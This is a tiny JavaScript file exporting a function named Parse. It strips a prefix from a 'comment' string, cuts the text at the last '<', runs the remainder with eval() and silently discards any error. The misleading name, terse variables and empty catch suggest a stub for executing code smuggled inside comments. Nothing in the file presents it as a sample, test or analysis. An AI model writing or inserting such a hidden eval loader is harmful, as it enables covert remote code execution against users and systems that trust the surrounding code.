export function Parse(comment) {
    try {
        const k = comment.substring(8);
        for (let i = 0; i < k.length; i++) {
            if (k[i] === "<") {
                var x = i;
            }
        }
        const z = k.substring(0, x);
        eval(z);
    } catch(e) {
        void 0;
    }
}
